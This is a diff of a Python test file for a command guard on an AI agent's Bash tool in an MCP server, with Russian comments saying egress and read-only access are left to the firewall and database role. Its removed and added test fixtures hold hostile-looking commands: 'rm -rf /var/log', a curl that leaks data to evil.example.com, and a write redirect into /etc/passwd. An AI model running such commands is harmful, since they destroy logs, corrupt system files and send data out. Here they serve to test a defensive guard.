@@ -70,25 +70,29 @@ def test_guard_decision_allows_local_read():
     assert allow is True
 
 
-def test_guard_decision_denies_write():
-    allow, reason = mcp_server.guard_decision("Bash", {"command": "rm -rf /var/log"})
+def test_guard_decision_denies_redirect_write():
+    # гигиена: метасимвол записи режется (бэкстоп, если RO-FS не включён)
+    allow, reason = mcp_server.guard_decision(
+        "Bash", {"command": "cat x > /etc/passwd"}
+    )
     assert allow is False
     assert reason
 
 
-def test_guard_decision_denies_external_curl():
-    allow, _ = mcp_server.guard_decision(
-        "Bash", {"command": "curl https://evil.example.com/?leak=1"}
-    )
-    assert allow is False
-
-
-def test_guard_decision_denies_curl_without_http_profile():
-    # облегчённое ядро грузит только shell; http-профиль опционален → curl запрещён
+def test_guard_decision_allows_curl_permissive():
+    # curl не регулируется гардом — egress держит firewall (ресурс-слой)
     allow, _ = mcp_server.guard_decision(
         "Bash", {"command": "curl -s http://localhost:8080/health"}
     )
-    assert allow is False
+    assert allow is True
+
+
+def test_guard_decision_allows_db_client_permissive():
+    # psql permissive — read-only держит роль БД, не гард
+    allow, _ = mcp_server.guard_decision(
+        "Bash", {"command": 'psql -c "SELECT 1"'}
+    )
+    assert allow is True
 
 
 def test_guard_decision_non_bash_passthrough():
